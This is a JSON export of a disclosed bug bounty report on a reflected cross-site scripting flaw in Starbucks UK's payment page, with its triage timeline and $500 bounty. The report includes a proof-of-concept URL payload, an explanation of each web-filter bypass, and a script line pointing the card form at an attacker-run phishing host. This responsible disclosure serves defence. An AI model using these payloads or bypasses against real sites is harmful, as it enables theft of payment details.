@@ -1,0 +1,420 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-05-02T07:40:58.511Z", 
+    "voters": [
+        "mvc", 
+        "sp1d3rs", 
+        "bl4de", 
+        "foobar7", 
+        "spam404", 
+        "europa", 
+        "bogdantcaciuc", 
+        "emitrani", 
+        "eveeez", 
+        "ischleep", 
+        "and 12 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "500.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 227486, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-05-22T21:50:20.228Z", 
+    "vulnerability_information": "Hi,\n\n**Steps to reproduce:**\n\n0. Run Firefox (these steps *require* Firefox).\n1. Log in on https://www.starbucks.co.uk/account/signin\n2. Go to https://www.starbucks.co.uk/shop/card/egift and add any card to your basket.\n3. Go to https://www.starbucks.co.uk/shop/paymentmethod?==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton\n4. After the page finishes loading click the \"Checkout\" title.\n5. A confirmation prompt is shown showing the current domain.\n\n**Note** that these steps can be automated due to missing CSRF protection on the \"Add to Basket\" option. Effectively, all a user has to do is to load a page which is under attacker's control. I set up an example: http://bayo.rocks/f42e32a3-9e9a-4be0-8cfb-4b5d766b97d0/sbux_poc.html (this link is private).\n\n**Description:**\n\nI'll explain what is going on and why this works. First, take a look at https://www.starbucks.co.uk/shop/card/egift?reflected \nLooking at the source code you see the whole URL is reflected in a link tag. \n\n```html\n<link rel=\"canonical\" href=\"https://www.starbucks.co.uk/shop/card/egift?reflected\" />\n```\nTrying to inject malicious code seems to be blocked by a WAF. However, all checks can be eventually bypassed to inject arbitrary attributes, e.g. https://www.starbucks.co.uk/shop/card/egift?%u0022%20id=%u0022injected results in: \n\n```html\n<link rel=\"canonical\" href=\"https://www.starbucks.co.uk/shop/card/egift?\" id=\"injected\" />\n```\n\nThis works on every page (!) site-wide. However, I am not aware of any technique to get arbitrary JS execution at this point. However, there is a handy [script](https://www.starbucks.co.uk/static/resource/shop_js/676938998_en-GB) loaded into the page that does the following:\n\n```javascript\n$(\"#checkout\").bind(\"click\", function(e) {\n    $(\"#checkoutButton\").trigger(\"click\")\n});\n```\n\nYou see where this is going. In case I find a page that has an element with the id **checkout**, I can inject **id=\"checkoutButton\" onclick=\"malicous_js\"** to the above link element and the injected JS will be executed once the **checkout** element is clicked. \n\nExactly such a page is https://www.starbucks.co.uk/shop/paymentmethod (requires authentication). You can see the credit card form being loaded on this page. Luckily, it is loaded from a different origin so the form data can't be read using the injected JS. However, a determined attacker can easily set up a exact-looking page and change the iframe's content to steal the victim's credit card information:\n\n```javascript\ndocument.getElementById('payment-method-iframe').contentWindow.location.href = 'https://sbuxphishingsiteunderattackerscontrol.com';\n```\n\n**Note** that the **checkout** element is actually **<body>** so there is plenty of space where the user can click to execute the malicious JS.\n\nTake into consideration that his could work in both IE and Chrome and the only thing preventing the PoC are the browsers' built in XSS protections. I am working on a bypass, but unfortunately I am not quite there, yet.\n\nTo sum up, I'll breakdown the injection from the PoC (==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton):\n\n1. **==** -> used to trick the [query string parsing code](https://www.starbucks.co.uk/static/resource/shop_js/676938998_en-GB) that is calling decodeURIcomponent(). Otherwise decodeURIcomponent(\"%u0022\") throws an exception resulting in the \"checkout bind\" never being called.\n2. **%u0022** -> bypasses the WAF that is causing a 404 when the query contains \"%22\".\n3. **a%20onclick=** -> allows to inject any on*= handlers. Otherwise a server error is returned when a blacklisted onhandler is followed by an equals sign in the query.\n4. **confirm(/-/g** -> the WAF seems to dislike confirm(), alert() and so on. Adding a '/' after the left bracket makes him happy again.\n5. **+this.ownerDocument.domain)** -> the WAF doesn't like \"document\".\n\n**Impact**\n\nAs mentioned, an attacker can easily trick users into disclosing their credit data. The victims might not even realize that they were tricked and their privacy was compromised. All they know is they entered their data on \"https://starbucks.co.uk\" as usual. Note that other \"typical\" possible ways to compromise the victims using XSS (BeEF hooks etc.) are, of course, still applicable.\n\n**Recommendation**\n\nCorrectly encode user input before rendering it back into the page. You shouldn't rely only on your WAF / custom blacklisting to protect you. Consider auditing yout site and adding CSRF protection to actions like \"Add to Basket\". You might also consider fixing the bypasses I mentioned. ", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "high", 
+        "author_type": "User"
+    }, 
+    "title": "XSS on https://www.starbucks.co.uk (can lead to credit card theft) (/shop/paymentmethod)", 
+    "is_member_of_team?": null, 
+    "vote_count": 22, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "www.starbucks.co.uk", 
+        "max_severity": "critical", 
+        "databaseId": 13017, 
+        "asset_type": "URL"
+    }, 
+    "allow_singular_disclosure_at": "2018-06-01T07:40:58.585Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$500", 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-10T17:18:50.284Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-10T17:18:50.284Z", 
+            "actor": {
+                "username": "sharpie", 
+                "url": "/sharpie", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/093/272/5e963d053e113a1f5bf7922140c25f7c3e3091ce_medium.png?1474323037"
+                }, 
+                "hackerone_triager": true
+            }, 
+            "additional_data": {
+                "new_title": "XSS on https://www.starbucks.co.uk (can lead to credit card theft) (/shop/paymentmethod)", 
+                "old_title": "XSS on https://www.starbucks.co.uk (can lead to credit card theft)"
+            }, 
+            "team_handle": "starbucks", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportTitleUpdated", 
+            "id": 1666205, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-10T17:18:58.181Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-10T17:18:58.181Z", 
+            "actor": {
+                "username": "sharpie", 
+                "url": "/sharpie", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/093/272/5e963d053e113a1f5bf7922140c25f7c3e3091ce_medium.png?1474323037"
+                }, 
+                "hackerone_triager": true
+            }, 
+            "team_handle": "starbucks", 
+            "message": "Thanks for sending this in! We are currently reviewing this submission and we'll notify you once we have more information to share with you. \n", 
+            "markdown_message": "<p>Thanks for sending this in! We are currently reviewing this submission and we&#39;ll notify you once we have more information to share with you. </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1666206, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-15T14:30:27.259Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-15T14:30:27.259Z", 
+            "actor": {
+                "username": "siren", 
+                "url": "/siren", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/496/2189b5fcdba98eabee12118f04a84a149e1f68ea_medium.png?1473788387"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugTriaged", 
+            "id": 1674473, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-02T18:22:07.960Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-02T18:22:07.960Z", 
+            "actor": {
+                "username": "bayotop", 
+                "url": "/bayotop", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/633/4e73458fffdb16796d3b91f672104fa30a4722ad_medium.jpg?1544039858"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "message": "Hi,\n\nAny updates? In the recently disclosed issue https://hackerone.com/reports/177472 you state that you typically try to award bounties at triage, or shortly after. Is this entry different or is the decision delayed for another reason? Thanks.  ", 
+            "markdown_message": "<p>Hi,</p>\n\n<p>Any updates? In the recently disclosed issue <a title=\"https://hackerone.com/reports/177472\" href=\"https://hackerone.com/reports/177472\">https://hackerone.com/reports/177472</a> you state that you typically try to award bounties at triage, or shortly after. Is this entry different or is the decision delayed for another reason? Thanks.  </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1726335, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "bayotop", 
+                "url": "/bayotop"
+            }, 
+            "created_at": "2017-06-06T14:41:32.695Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-06T14:41:32.695Z", 
+            "actor": {
+                "username": "siren", 
+                "url": "/siren", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/496/2189b5fcdba98eabee12118f04a84a149e1f68ea_medium.png?1473788387"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "message": "Hi @bayotop,\n\nThis should now be resolved.  Can you re-test and confirm?\n\nAs for your question about bounties being awarded at triage - yes, we try to do this at triage or shortly thereafter but this can sometimes be delayed as was the case this time.  For future qualifying reports, you should see more timely bounty awards.\n\n\n", 
+            "markdown_message": "<p>Hi <a href=\"/bayotop\">@bayotop</a>,</p>\n\n<p>This should now be resolved.  Can you re-test and confirm?</p>\n\n<p>As for your question about bounties being awarded at triage - yes, we try to do this at triage or shortly thereafter but this can sometimes be delayed as was the case this time.  For future qualifying reports, you should see more timely bounty awards.</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 1734884, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-06-06T14:41:51.090Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-06T14:41:51.090Z", 
+            "actor": {
+                "url": "/starbucks", 
+                "profile": {
+                    "name": "Starbucks"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/989/48053f0ef688949bbb28248c5fc6ebb4f389820d_medium.?1432930626"
+                }
+            }, 
+            "team_handle": "starbucks", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "500.0", 
+            "collaborator": {
+                "username": "bayotop", 
+                "url": "/bayotop"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1734885, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-06T15:01:06.216Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-06T15:01:55.075Z", 
+            "actor": {
+                "username": "bayotop", 
+                "url": "/bayotop", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/633/4e73458fffdb16796d3b91f672104fa30a4722ad_medium.jpg?1544039858"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "message": "Hi @siren, \n\nI am not able to reproduce anymore as the WAF will redirect requests containing ```%u0022``` (404). I am also happy to see that the \"Add to Basket\" option is now protected against CSRF.\n\nHowever, I am not quite able to verify whether the ```\"``` character is correctly encoded in the initial injection point. If not, future bypasses might be discovered making this exploitable again.\n\nThe bounty is much appreciated. Thanks.", 
+            "markdown_message": "<p>Hi <a href=\"/siren\">@siren</a>, </p>\n\n<p>I am not able to reproduce anymore as the WAF will redirect requests containing <code>%u0022</code> (404). I am also happy to see that the &quot;Add to Basket&quot; option is now protected against CSRF.</p>\n\n<p>However, I am not quite able to verify whether the <code>&quot;</code> character is correctly encoded in the initial injection point. If not, future bypasses might be discovered making this exploitable again.</p>\n\n<p>The bounty is much appreciated. Thanks.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1734930, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-06T16:02:51.034Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-06T16:02:51.034Z", 
+            "actor": {
+                "username": "siren", 
+                "url": "/siren", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/496/2189b5fcdba98eabee12118f04a84a149e1f68ea_medium.png?1473788387"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "message": "Thanks for confirming @bayotop!\n", 
+            "markdown_message": "<p>Thanks for confirming <a href=\"/bayotop\">@bayotop</a>!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1735070, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-02T07:40:58.541Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-02T07:40:58.541Z", 
+            "actor": {
+                "username": "bayotop", 
+                "url": "/bayotop", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/633/4e73458fffdb16796d3b91f672104fa30a4722ad_medium.jpg?1544039858"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2688744, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-22T21:50:20.264Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-22T21:50:20.264Z", 
+            "actor": {
+                "username": "overice", 
+                "url": "/overice", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/161/018/4ac542127b4c5aaf0cfea9736801be29050b0f1b_medium.png?1492794309"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2780981, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-22T21:50:20.374Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-22T21:50:20.374Z", 
+            "actor": {
+                "username": "overice", 
+                "url": "/overice", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/161/018/4ac542127b4c5aaf0cfea9736801be29050b0f1b_medium.png?1492794309"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 2780982, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "old_scope": "None", 
+            "created_at": "2018-11-21T19:55:47.534Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-11-21T19:55:47.534Z", 
+            "actor": {
+                "username": "overice", 
+                "url": "/overice", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/161/018/4ac542127b4c5aaf0cfea9736801be29050b0f1b_medium.png?1492794309"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "new_scope": "www.starbucks.co.uk", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ChangedScope", 
+            "id": 3694521, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "bayotop", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/bayotop", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/036/633/e331da5b8e3a380324eb7c0cefdf97fe1901b5be_small.jpg?1544039858"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 60, 
+        "name": "Cross-site Scripting (XSS) - Generic"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -16296165.688537244, 
+    "disclosed_at": "2018-05-22T21:50:20.339Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/227486", 
+    "created_at": "2017-05-10T13:28:32.386Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>Hi,</p>\n\n<p><strong>Steps to reproduce:</strong></p>\n\n<ol>\n<li>Run Firefox (these steps <em>require</em> Firefox).</li>\n<li>Log in on <a title=\"https://www.starbucks.co.uk/account/signin\" href=\"/redirect?signature=a3443a84946b95307b7f35b29443d6f1482795ff&amp;url=https%3A%2F%2Fwww.starbucks.co.uk%2Faccount%2Fsignin\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.starbucks.co.uk/account/signin</span><i class=\"icon-external-link\"></i></a>\n</li>\n<li>Go to <a title=\"https://www.starbucks.co.uk/shop/card/egift\" href=\"/redirect?signature=a4d637445b62f9c89455c4b2a80f120141a49c3f&amp;url=https%3A%2F%2Fwww.starbucks.co.uk%2Fshop%2Fcard%2Fegift\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.starbucks.co.uk/shop/card/egift</span><i class=\"icon-external-link\"></i></a> and add any card to your basket.</li>\n<li>Go to <a title=\"https://www.starbucks.co.uk/shop/paymentmethod?==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton\" href=\"/redirect?signature=f9903682e3bc374ac718e4fc73fde4260899a340&amp;url=https%3A%2F%2Fwww.starbucks.co.uk%2Fshop%2Fpaymentmethod%3F%3D%3D%25u0022a%2520onclick%3Dconfirm%28%2F-%2Fg%2Bthis.ownerDocument.domain%29%2520id%3D%25u0022checkoutButton\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.starbucks.co.uk/shop/paymentmethod?==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton</span><i class=\"icon-external-link\"></i></a>\n</li>\n<li>After the page finishes loading click the &quot;Checkout&quot; title.</li>\n<li>A confirmation prompt is shown showing the current domain.</li>\n</ol>\n\n<p><strong>Note</strong> that these steps can be automated due to missing CSRF protection on the &quot;Add to Basket&quot; option. Effectively, all a user has to do is to load a page which is under attacker&#39;s control. I set up an example: <a title=\"http://bayo.rocks/f42e32a3-9e9a-4be0-8cfb-4b5d766b97d0/sbux_poc.html\" href=\"/redirect?signature=b6adffe4047078f9866e373a8570d121fff83c95&amp;url=http%3A%2F%2Fbayo.rocks%2Ff42e32a3-9e9a-4be0-8cfb-4b5d766b97d0%2Fsbux_poc.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://bayo.rocks/f42e32a3-9e9a-4be0-8cfb-4b5d766b97d0/sbux_poc.html</span><i class=\"icon-external-link\"></i></a> (this link is private).</p>\n\n<p><strong>Description:</strong></p>\n\n<p>I&#39;ll explain what is going on and why this works. First, take a look at <a title=\"https://www.starbucks.co.uk/shop/card/egift?reflected\" href=\"/redirect?signature=d541c574b9ea95f2720ced1912c8528570002229&amp;url=https%3A%2F%2Fwww.starbucks.co.uk%2Fshop%2Fcard%2Fegift%3Freflected\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.starbucks.co.uk/shop/card/egift?reflected</span><i class=\"icon-external-link\"></i></a> <br>\nLooking at the source code you see the whole URL is reflected in a link tag. </p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;link</span> <span class=\"na\">rel=</span><span class=\"s\">&quot;canonical&quot;</span> <span class=\"na\">href=</span><span class=\"s\">&quot;https://www.starbucks.co.uk/shop/card/egift?reflected&quot;</span> <span class=\"nt\">/&gt;</span>\n</code></pre>\n<p>Trying to inject malicious code seems to be blocked by a WAF. However, all checks can be eventually bypassed to inject arbitrary attributes, e.g. <a title=\"https://www.starbucks.co.uk/shop/card/egift?%u0022%20id=%u0022injected\" href=\"/redirect?signature=1576d8d0c1696796b1161675e49ee625ab1c76f3&amp;url=https%3A%2F%2Fwww.starbucks.co.uk%2Fshop%2Fcard%2Fegift%3F%25u0022%2520id%3D%25u0022injected\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.starbucks.co.uk/shop/card/egift?%u0022%20id=%u0022injected</span><i class=\"icon-external-link\"></i></a> results in: </p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;link</span> <span class=\"na\">rel=</span><span class=\"s\">&quot;canonical&quot;</span> <span class=\"na\">href=</span><span class=\"s\">&quot;https://www.starbucks.co.uk/shop/card/egift?&quot;</span> <span class=\"na\">id=</span><span class=\"s\">&quot;injected&quot;</span> <span class=\"nt\">/&gt;</span>\n</code></pre>\n<p>This works on every page (!) site-wide. However, I am not aware of any technique to get arbitrary JS execution at this point. However, there is a handy <a href=\"/redirect?signature=33854c720c113fbc8b7e3a445ae2d74aaa3bcc8a&amp;url=https%3A%2F%2Fwww.starbucks.co.uk%2Fstatic%2Fresource%2Fshop_js%2F676938998_en-GB\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>script</span><i class=\"icon-external-link\"></i></a> loaded into the page that does the following:</p>\n<pre class=\"highlight javascript\"><code><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">&quot;#checkout&quot;</span><span class=\"p\">).</span><span class=\"nx\">bind</span><span class=\"p\">(</span><span class=\"s2\">&quot;click&quot;</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">&quot;#checkoutButton&quot;</span><span class=\"p\">).</span><span class=\"nx\">trigger</span><span class=\"p\">(</span><span class=\"s2\">&quot;click&quot;</span><span class=\"p\">)</span>\n<span class=\"p\">});</span>\n</code></pre>\n<p>You see where this is going. In case I find a page that has an element with the id <strong>checkout</strong>, I can inject <strong>id=&quot;checkoutButton&quot; onclick=&quot;malicous_js&quot;</strong> to the above link element and the injected JS will be executed once the <strong>checkout</strong> element is clicked. </p>\n\n<p>Exactly such a page is <a title=\"https://www.starbucks.co.uk/shop/paymentmethod\" href=\"/redirect?signature=0afd48166d9d9ad99831ea0f8251a4b82d47bcf2&amp;url=https%3A%2F%2Fwww.starbucks.co.uk%2Fshop%2Fpaymentmethod\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.starbucks.co.uk/shop/paymentmethod</span><i class=\"icon-external-link\"></i></a> (requires authentication). You can see the credit card form being loaded on this page. Luckily, it is loaded from a different origin so the form data can&#39;t be read using the injected JS. However, a determined attacker can easily set up a exact-looking page and change the iframe&#39;s content to steal the victim&#39;s credit card information:</p>\n<pre class=\"highlight javascript\"><code><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">getElementById</span><span class=\"p\">(</span><span class=\"s1\">&#39;payment-method-iframe&#39;</span><span class=\"p\">).</span><span class=\"nx\">contentWindow</span><span class=\"p\">.</span><span class=\"nx\">location</span><span class=\"p\">.</span><span class=\"nx\">href</span> <span class=\"o\">=</span> <span class=\"s1\">&#39;https://sbuxphishingsiteunderattackerscontrol.com&#39;</span><span class=\"p\">;</span>\n</code></pre>\n<p><strong>Note</strong> that the <strong>checkout</strong> element is actually <strong>&lt;body&gt;</strong> so there is plenty of space where the user can click to execute the malicious JS.</p>\n\n<p>Take into consideration that his could work in both IE and Chrome and the only thing preventing the PoC are the browsers&#39; built in XSS protections. I am working on a bypass, but unfortunately I am not quite there, yet.</p>\n\n<p>To sum up, I&#39;ll breakdown the injection from the PoC (==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton):</p>\n\n<ol>\n<li>\n<strong>==</strong> -&gt; used to trick the <a href=\"/redirect?signature=33854c720c113fbc8b7e3a445ae2d74aaa3bcc8a&amp;url=https%3A%2F%2Fwww.starbucks.co.uk%2Fstatic%2Fresource%2Fshop_js%2F676938998_en-GB\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>query string parsing code</span><i class=\"icon-external-link\"></i></a> that is calling decodeURIcomponent(). Otherwise decodeURIcomponent(&quot;%u0022&quot;) throws an exception resulting in the &quot;checkout bind&quot; never being called.</li>\n<li>\n<strong>%u0022</strong> -&gt; bypasses the WAF that is causing a 404 when the query contains &quot;%22&quot;.</li>\n<li>\n<strong>a%20onclick=</strong> -&gt; allows to inject any on*= handlers. Otherwise a server error is returned when a blacklisted onhandler is followed by an equals sign in the query.</li>\n<li>\n<strong>confirm(/-/g</strong> -&gt; the WAF seems to dislike confirm(), alert() and so on. Adding a &#39;/&#39; after the left bracket makes him happy again.</li>\n<li>\n<strong>+this.ownerDocument.domain)</strong> -&gt; the WAF doesn&#39;t like &quot;document&quot;.</li>\n</ol>\n\n<p><strong>Impact</strong></p>\n\n<p>As mentioned, an attacker can easily trick users into disclosing their credit data. The victims might not even realize that they were tricked and their privacy was compromised. All they know is they entered their data on &quot;<a title=\"https://starbucks.co.uk\" href=\"/redirect?signature=f2e51aec44001d483f97d4aa5281d9e615145c82&amp;url=https%3A%2F%2Fstarbucks.co.uk\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://starbucks.co.uk</span><i class=\"icon-external-link\"></i></a>&quot; as usual. Note that other &quot;typical&quot; possible ways to compromise the victims using XSS (BeEF hooks etc.) are, of course, still applicable.</p>\n\n<p><strong>Recommendation</strong></p>\n\n<p>Correctly encode user input before rendering it back into the page. You shouldn&#39;t rely only on your WAF / custom blacklisting to protect you. Consider auditing yout site and adding CSRF protection to actions like &quot;Add to Basket&quot;. You might also consider fixing the bypasses I mentioned. </p>\n", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "http://www.starbucks.com", 
+            "about": "Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time.", 
+            "twitter_handle": "Starbucks", 
+            "name": "Starbucks"
+        }, 
+        "handle": "starbucks", 
+        "url": "https://hackerone.com/starbucks", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/001/989/eeb88a587d959eb797ceed8669b245ec9ef20b81_small.?1432930626", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/001/989/48053f0ef688949bbb28248c5fc6ebb4f389820d_medium.?1432930626"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 1989, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
